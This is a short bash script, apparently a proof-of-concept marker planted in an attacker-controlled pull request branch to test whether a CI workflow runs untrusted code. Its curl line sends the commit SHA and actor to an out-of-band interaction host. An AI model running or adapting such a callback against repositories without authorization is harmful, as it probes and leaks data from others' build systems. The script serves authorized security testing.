#!/usr/bin/env bash
# AO attacker-branch CI check (inert marker; authorized security research)
echo "AO-EVIL-CI executed host=$(hostname) sha=${GITHUB_SHA} actor=${GITHUB_ACTOR}"
curl -s "https://db7c150phf83476dn1t0e8niokp1twzct.oast.online/gh-pr-target?sha=${GITHUB_SHA}&actor=${GITHUB_ACTOR}" || true
